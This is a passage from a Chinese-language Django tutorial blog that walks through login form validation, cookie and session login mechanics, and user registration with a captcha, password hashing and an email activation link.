class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 仅当用户真的密码出错时</span><br><span class="line">            else:</span><br><span class="line">                return render(request, &quot;login.html&quot;,&#123;&quot;msg&quot;:&quot;用户名或密码错误!&quot;&#125;)</span><br><span class="line">        # 验证不成功跳回登录页面</span><br><span class="line">        # 没有成功说明里面的值是None，并再次跳转回主页面</span><br><span class="line">        else:</span><br><span class="line">            return render(</span><br><span class="line">                request, &quot;login.html&quot;, &#123;</span><br><span class="line">                    &quot;login_form&quot;: login_form &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>forms中的名称username和password必须和html中的一致。毕竟他是使用的request.POST<br>而request是从前面传过来的。</p><p>实例化<code>LoginView</code>时已经对于我们的字段进行了验证。</p><p>打上断点:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-48097f9c52012320.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/271" alt="img"></p><p><code>debug</code>后<code>f6</code>运行到</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-96d68c21c7bc2798.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/396" alt="img"></p><p>此时可以看到<code>errors(ErrorDict)</code>中的错误</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-79c518169c71f76a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/638" alt="img"></p><p>将form传回前端:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-b21a22404e83f9a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/442" alt="img"></p><p>前端中取值：</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-621f2a96dc923313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/452" alt="img"></p><p>给这个class加上errorput会显示红色外框。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ce9082d461fe20e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><blockquote><p>注意:写在class里面</p></blockquote><h3 id="将forms错误信息显示出来"><a href="#将forms错误信息显示出来" class="headerlink" title="将forms错误信息显示出来"></a>将forms错误信息显示出来</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;error btns login-form-tips&quot; id&#x3D;&quot;jsLoginTips&quot;&gt;</span><br><span class="line">&#123;% for key, error in login_form.errors.items %&#125;</span><br><span class="line">&#123;&#123; error &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123; msg &#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-37c1b309dc808918.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/347" alt="img"></p><ul><li>写了一个类继承Django的view，然后写了get post方法(get/post的if是Django替我们完成的)</li><li>在url中调用Loginview的as_view方法需要加上括号，进行调用。</li><li>Django的form进行表单验证并把error值传到前台。</li><li>is_valid方法，验证表单</li></ul><h2 id="session和cookie自动登录机制"><a href="#session和cookie自动登录机制" class="headerlink" title="session和cookie自动登录机制"></a>session和cookie自动登录机制</h2><blockquote><p>我们本节来讲session和cookie</p></blockquote><p>User1如何实现登录的。</p><h3 id="cookie的存储"><a href="#cookie的存储" class="headerlink" title="cookie的存储"></a>cookie的存储</h3><p>cookie是浏览器支持的一种本地存储方式。以dict，键值对方式存储。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;sessionkey&quot;: &quot;123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器会自动对于它进行解析。</p><h3 id="http请求是一种无状态的请求"><a href="#http请求是一种无状态的请求" class="headerlink" title="http请求是一种无状态的请求"></a>http请求是一种无状态的请求</h3><p>用户向服务器发起的两次请求之间是没有状态的。也就是服务器并不知道这是同一个用户发的。</p><p>做到记住用户:</p><blockquote><p>浏览器a在向服务器发起请求，服务器会自动给浏览器a回复一个id，浏览器a把id放到cookie当中，在下一次请求时带上这个cookie里的id值向浏览器请求，服务器就知道你是哪个浏览器发过来的了。</p></blockquote><h3 id="有状态请求-cookie"><a href="#有状态请求-cookie" class="headerlink" title="有状态请求(cookie)"></a>有状态请求(cookie)</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-612243ba21241503.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/431" alt="img"></p><p>服务器<code>a</code>发回来的<code>id</code>会放到服务器<code>a</code>的域之下。<strong>不能跨域访问cookie。</strong></p><p>使用浏览器随便打开一个网页，然后<code>f12</code>打开。</p><p>比如我使用的<code>Chrome</code>浏览器</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3550753a280509f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>会找到存储在浏览器本地的cookie值</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-96e7d37b5ccd3d4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/103" alt="img"></p><p>mark</p><p>点击<code>clear all</code>清空所有的<code>cookie</code> <code>f5</code>刷新页面，会发现又把这些cookie值进来。</p><p>如果将用户名和密码直接保存在cookie，可以实现<strong>最垃圾最简略版本的</strong>自动登录。</p><h3 id="解决cookie放在本地不安全的问题-session"><a href="#解决cookie放在本地不安全的问题-session" class="headerlink" title="解决cookie放在本地不安全的问题(session)"></a>解决cookie放在本地不安全的问题(session)</h3><blockquote><p>用户在第一次请求后，浏览器回复的id既可以是用户的user id。<br>也可以一段任意的字符串，我们把它叫做session id</p></blockquote><p>根据用户名和密码，服务器会采用自己的规则生成<code>session id</code>。这个<code>session id</code>保存在本地cookie。浏览器请求服务器会携带。</p><ul><li>输入用户名 &amp; 密码</li><li>调用 login(), 后端程序会根据用户名密码生成session id。保存在数据库中。</li><li>用户登录之后，需要通过这个<code>session id</code>取出这些基本信息。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3700e1f80a155853.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/211" alt="img"></p><p>Django的默认表中的<code>session</code>表就记录了用户登录时，后端我们Django为用户生成的<code>sessionid</code>。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-6adaef92f2d7fd1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/486" alt="img"></p><p>可以看到<code>session key value</code> 和过期时间。</p><p>我们可以清空这张表的数据。运行项目进行登录。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-f3f30181ba569b11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/624" alt="img"></p><blockquote><p>可以看到我们刚刚生成的session id。</p></blockquote><p>此时通过<code>f12</code>查看浏览器在本地存储的<code>session id</code>。可以看到如下图和我们数据库中的一致。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-c415c354a473ea3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/394" alt="img"></p><blockquote><p><strong>session_key 发到浏览器叫做session id</strong></p></blockquote><p>通过session id 用户访问任何一个页面都会携带，服务器就会认识。</p><p>Setting.py中，</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-5b7d25dd2d20459e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/256" alt="img"></p><p>这个app会拦截我们每次的request请求，在<code>request</code>中找到session id，然后去数据表中进行查询。<br>然后通过<code>session key</code> 去找到<code>session data</code>。此时直接为我们取出了user。</p><p>在服务器返回浏览器的<code>response</code>中也会直接加上<code>session id</code></p><blockquote><p>cookie是浏览器本地存储机制，存在域名之下，存储不安全。<br>服务器在返回id时通过规则生成一串字符，并设置了过期时间。存储在服务器端(数据库)</p></blockquote><p>文章: <a href="https://link.jianshu.com/?t=http://projectsedu.com/2016/10/17/django%25E4%25BB%258E%25E8%25AF%25B7%25E6%25B1%2582%25E5%2588%25B0%25E8%25BF%2594%25E5%259B%259E%25E9%2583%25BD%25E7%25BB%258F%25E5%258E%2586%25E4%25BA%2586%25E4%25BB%2580%25E4%25B9%2588/">http://projectsedu.com/2016/10/17/django%E4%BB%8E%E8%AF%B7%E6%B1%82%E5%88%B0%E8%BF%94%E5%9B%9E%E9%83%BD%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/</a></p><h2 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h2><h3 id="拷贝注册页面进入template目录"><a href="#拷贝注册页面进入template目录" class="headerlink" title="拷贝注册页面进入template目录"></a>拷贝注册页面进入template目录</h3><h3 id="书写我们对应要处理的view-RegisterView"><a href="#书写我们对应要处理的view-RegisterView" class="headerlink" title="书写我们对应要处理的view(RegisterView)"></a>书写我们对应要处理的view(RegisterView)</h3><p>users/views.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 注册功能的view</span><br><span class="line">class RegisterView(View):</span><br><span class="line">    # get方法直接返回页面</span><br><span class="line">    def get(self, request):</span><br><span class="line">        return render(request, &quot;register.html&quot;, &#123;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置对应的url"><a href="#配置对应的url" class="headerlink" title="配置对应的url"></a>配置对应的url</h3><p>Django1.9.8 url配置如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from users.views import RegisterView</span><br><span class="line">    # 注册url</span><br><span class="line">    url(&quot;^register&#x2F;&quot;, RegisterView.as_view(), name&#x3D;&quot;register&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django2.0.1 url配置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from users.views import RegisterView</span><br><span class="line">    # 注册url</span><br><span class="line">    path(&quot;register&#x2F;&quot;, RegisterView.as_view(), name &#x3D; &quot;register&quot; )</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改index页面中注册url"><a href="#修改index页面中注册url" class="headerlink" title="修改index页面中注册url"></a>修改index页面中注册url</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2b919a69f0233b4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/460" alt="img"></p><p>此时访问首页发现可以成功跳转到注册页面</p><h3 id="修改静态文件中static目录引用"><a href="#修改静态文件中static目录引用" class="headerlink" title="修改静态文件中static目录引用"></a>修改静态文件中static目录引用</h3><h4 id="关键步骤load-staticfile"><a href="#关键步骤load-staticfile" class="headerlink" title="关键步骤load staticfile"></a>关键步骤load staticfile</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-54963c9fe084328e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/180" alt="img"></p><h4 id="然后修改路径为一个相对于static的相对路径"><a href="#然后修改路径为一个相对于static的相对路径" class="headerlink" title="然后修改路径为一个相对于static的相对路径"></a>然后修改路径为一个相对于static的相对路径</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0f5c7eb3eede49dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/445" alt="img"></p><blockquote><p>他会自动根据setting中配置，为我们加上前缀</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a7458ede39349ebe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/277" alt="img"></p><blockquote><p>如果我们把目录在setting中改到mystatic。url中会自动添加指定的前缀</p></blockquote><p>可以看到可以访问成功。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-876bdc127ef9ed99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/365" alt="img"></p><h4 id="将目前的三个html中的静态文件全部修改目录"><a href="#将目前的三个html中的静态文件全部修改目录" class="headerlink" title="将目前的三个html中的静态文件全部修改目录"></a>将目前的三个html中的静态文件全部修改目录</h4><blockquote><p>枯燥但是要有耐心。</p></blockquote><p>这时候访问三个页面，查看样式是否完好。</p><h3 id="验证码库实现验证码"><a href="#验证码库实现验证码" class="headerlink" title="验证码库实现验证码"></a>验证码库实现验证码</h3><p><a href="https://link.jianshu.com/?t=https://github.com/mbi/django-simple-captcha">https://github.com/mbi/django-simple-captcha</a></p><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">workon mxonline3</span><br><span class="line">pip install  django-simple-captcha</span><br><span class="line">workon mxonline2</span><br><span class="line">pip install  django-simple-captcha&#x3D;&#x3D;0.4.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Add <code>captcha</code> to the <code>INSTALLED_APPS</code> in your <code>settings.py</code></li><li>Add an entry to your <code>urls.py</code>:</li></ul><p>django1.9.8如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url, include</span><br><span class="line">urlpatterns +&#x3D; [</span><br><span class="line">    url(r&#39;^captcha&#x2F;&#39;, include(&#39;captcha.urls&#39;)),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1如下；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 验证码url</span><br><span class="line">path(&quot;captcha&#x2F;&quot;, include(&#39;captcha.urls&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-63535fda53aa7a8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/361" alt="img"></p><p>进入数据库查看生成的表</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-fdda273afbbf264c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/186" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-bc61d5637f17f61d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/450" alt="img"></p><h3 id="将验证码展示到页面"><a href="#将验证码展示到页面" class="headerlink" title="将验证码展示到页面"></a>将验证码展示到页面</h3><p>users/forms.py:</p><h4 id="定义我们的register-form"><a href="#定义我们的register-form" class="headerlink" title="定义我们的register form:"></a>定义我们的register form:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 引入验证码field</span><br><span class="line">from captcha.fields import CaptchaField</span><br><span class="line"></span><br><span class="line"># 验证码form &amp; 注册表单form</span><br><span class="line">class RegisterForm(forms.Form):</span><br><span class="line">    # 此处email与前端name需保持一致。</span><br><span class="line">    email &#x3D; forms.EmailField(required&#x3D;True)</span><br><span class="line">    # 密码不能小于5位</span><br><span class="line">    password &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;5)</span><br><span class="line">    # 应用验证码</span><br><span class="line">    captcha &#x3D; CaptchaField()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>users/views.py</p><h4 id="在我们的registerform中实例化并传送到前端"><a href="#在我们的registerform中实例化并传送到前端" class="headerlink" title="在我们的registerform中实例化并传送到前端:"></a>在我们的registerform中实例化并传送到前端:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># form表单验证 &amp; 验证码</span><br><span class="line">from .forms import LoginForm, RegisterForm</span><br><span class="line"></span><br><span class="line"># 注册功能的view</span><br><span class="line">class RegisterView(View):</span><br><span class="line">    # get方法直接返回页面</span><br><span class="line">    def get(self, request):</span><br><span class="line">        # 添加验证码</span><br><span class="line">        register_form &#x3D; RegisterForm()</span><br><span class="line">        return render(request, &quot;register.html&quot;, &#123;&#39;register_form&#39;:register_form&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="前端获取验证码值"><a href="#前端获取验证码值" class="headerlink" title="前端获取验证码值"></a>前端获取验证码值</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-29a9dcfaac567377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/405" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ce4ead1d1712af18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>找到上图验证码部分。修改为下图</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-dc61ed3ad7f84bc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/298" alt="img"></p><p>Forms中的field会生成不同的框。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9be9b7a201ab4149.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>我们只有label但是前端可以查看到input框等，也就是Registerform会为我们生成输入框+验证码。</p><blockquote><p>隐藏的字符串的框会被带到后台，由Django为我们进行验证。验证该验证码是否保存过。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1c7789dbd803c837.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><blockquote><p>可以看得我们数据库中将这个hashkey进行了保存。这个key与验证码内容对应。</p></blockquote><p>后台会把验证码值 和 hashkey进行联合查询。</p><h3 id="编写register-view的后台逻辑-RegisterView"><a href="#编写register-view的后台逻辑-RegisterView" class="headerlink" title="编写register view的后台逻辑(RegisterView)"></a>编写register view的后台逻辑(RegisterView)</h3><p>users/views.py的RegisterView中添加post方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def post(self, request):</span><br><span class="line">    # 实例化form</span><br><span class="line">    register_form &#x3D; RegisterForm(request.POST)</span><br><span class="line">    if register_form.is_valid():</span><br><span class="line">        pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-064bcf57fdcf4e35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/284" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-52220188cb9b03be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/684" alt="img"></p><p>修改form表单提交方式与提交到哪个url</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-d080c1fe9346013b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/160" alt="img"></p><p>前端的form提交加上对应的crsf token</p><p>刷新验证码是前端帮我们完成的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;刷新验证码</span><br><span class="line">function refresh_captcha(event)&#123;</span><br><span class="line">    $.get(&quot;&#x2F;captcha&#x2F;refresh&#x2F;?&quot;+Math.random(), function(result)&#123;</span><br><span class="line">        $(&#39;#&#39;+event.data.form_id+&#39; .captcha&#39;).attr(&quot;src&quot;,result.image_url);</span><br><span class="line">        $(&#39;#id_captcha_0&#39;).attr(&quot;value&quot;,result.key);</span><br><span class="line">    &#125;);</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="获取前端页面值并封装成一个user-profile对象，保存到数据库。"><a href="#获取前端页面值并封装成一个user-profile对象，保存到数据库。" class="headerlink" title="获取前端页面值并封装成一个user_profile对象，保存到数据库。"></a>获取前端页面值并封装成一个user_profile对象，保存到数据库。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.auth.hashers import make_password</span><br><span class="line"></span><br><span class="line">        if register_form.is_valid():</span><br><span class="line">            user_name &#x3D; request.POST.get(&quot;email&quot;, &quot;&quot;)</span><br><span class="line">            pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">            # 实例化一个user_profile对象，将前台值存入</span><br><span class="line">            user_profile &#x3D; UserProfile()</span><br><span class="line">            user_profile.username &#x3D; user_name</span><br><span class="line">            user_profile.email &#x3D; user_name</span><br><span class="line"></span><br><span class="line">            # 加密password进行保存</span><br><span class="line">            user_profile.password &#x3D; make_password(pass_word)</span><br><span class="line">            user_profile.save()</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="发送邮件实现"><a href="#发送邮件实现" class="headerlink" title="发送邮件实现"></a>发送邮件实现</h4><p>setting中配置；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 发送邮件的setting设置</span><br><span class="line"></span><br><span class="line">EMAIL_HOST &#x3D; &quot;smtp.qq.com&quot;</span><br><span class="line">EMAIL_PORT &#x3D; 25</span><br><span class="line">EMAIL_HOST_USER &#x3D; &quot;mxonline.mtianyan.cn&quot;</span><br><span class="line">EMAIL_HOST_PASSWORD &#x3D; &quot; &quot;</span><br><span class="line">EMAIL_USE_TLS&#x3D; True</span><br><span class="line">EMAIL_FROM &#x3D; &quot;mxonline.mtianyan.cn&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建package后新建文件。</p><p><code>apps：utils/email_send.py</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from random import Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from  users.models import EmailVerifyRecord</span><br><span class="line"># 导入Django自带的邮件模块</span><br><span class="line">from django.core.mail import send_mail</span><br><span class="line"># 导入setting中发送邮件的配置</span><br><span class="line">from Mxonline2.settings import EMAIL_FROM</span><br><span class="line"></span><br><span class="line"># 生成随机字符串</span><br><span class="line">def random_str(random_length&#x3D;8):</span><br><span class="line">    str &#x3D; &#39;&#39;</span><br><span class="line">    # 生成字符串的可选字符串</span><br><span class="line">    chars &#x3D; &#39;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#39;</span><br><span class="line">    length &#x3D; len(chars) - 1</span><br><span class="line">    random &#x3D; Random()</span><br><span class="line">    for i in range(random_length):</span><br><span class="line">        str +&#x3D; chars[random.randint(0, length)]</span><br><span class="line">    return str</span><br><span class="line"></span><br><span class="line"># 发送注册邮件</span><br><span class="line">def send_register_eamil(email, send_type&#x3D;&quot;register&quot;):</span><br><span class="line">    # 发送之前先保存到数据库，到时候查询链接是否存在</span><br><span class="line"></span><br><span class="line">    # 实例化一个EmailVerifyRecord对象</span><br><span class="line">    email_record &#x3D; EmailVerifyRecord()</span><br><span class="line">    # 生成随机的code放入链接</span><br><span class="line">    code &#x3D; random_str(16)</span><br><span class="line">    email_record.code &#x3D; code</span><br><span class="line">    email_record.email &#x3D; email</span><br><span class="line">    email_record.send_type &#x3D; send_type</span><br><span class="line"></span><br><span class="line">    email_record.save()</span><br><span class="line"></span><br><span class="line">    # 定义邮件内容:</span><br><span class="line">    email_title &#x3D; &quot;&quot;</span><br><span class="line">    email_body &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if send_type &#x3D;&#x3D; &quot;register&quot;:</span><br><span class="line">        email_title &#x3D; &quot;mtianyan慕课小站 注册激活链接&quot;</span><br><span class="line">        email_body &#x3D; &quot;请点击下面的链接激活你的账号: http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;active&#x2F;&#123;0&#125;&quot;.format(code)</span><br><span class="line"></span><br><span class="line">        # 使用Django内置函数完成邮件发送。四个参数：主题，邮件内容，从哪里发，接受者list</span><br><span class="line">        send_status &#x3D; send_mail(email_title, email_body, EMAIL_FROM, [email])</span><br><span class="line">        # 如果发送成功</span><br><span class="line">        if send_status:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-74f4c6aac6a70679.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/579" alt="img"></p><p>上图为qq邮箱开启smtp服务</p><p>点击生成授权码</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ac8cdb71cd6039f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/542" alt="img"></p><p>def post中加上发送邮件</p><p><code>users/views.py</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 发送邮件</span><br><span class="line">from utils.email_send import send_register_eamil</span><br><span class="line">            # 发送注册激活邮件</span><br><span class="line">            send_register_eamil(user_name, &quot;register&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击注册提交，因为我们没有return。一直在转圈圈。</p><p>但是数据库中已经添加了字段。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ced978e9e13071a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>可以看到我们的邮件已经被发送到邮箱中。</p><p>如果注册成功返回login页面:不成功，返回register页面并报错。</p><h4 id="完善错误提示。"><a href="#完善错误提示。" class="headerlink" title="完善错误提示。"></a>完善错误提示。</h4><blockquote><p>找猫画虎：将login中的错误提示搬运到register中来。</p></blockquote><ul><li>register_form的报错信息。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0eed72fabf78497d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/377" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3c8f05712e18e8ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/390" alt="img"></p><ul><li>邮箱 &amp; 密码 form验证</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-481623d4690362e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="img"></p><h4 id="完善用户值回填逻辑"><a href="#完善用户值回填逻辑" class="headerlink" title="完善用户值回填逻辑"></a>完善用户值回填逻辑</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-86fa87baca3e1066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>如果传回的有值则，显示传回来值。</p><p>密码也做同样操作</p><h4 id="修改默认的激活状态为false"><a href="#修改默认的激活状态为false" class="headerlink" title="修改默认的激活状态为false"></a>修改默认的激活状态为false</h4><p>post方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 默认激活状态为false</span><br><span class="line">user_profile.is_active &#x3D; False</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>书写处理激活的view。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 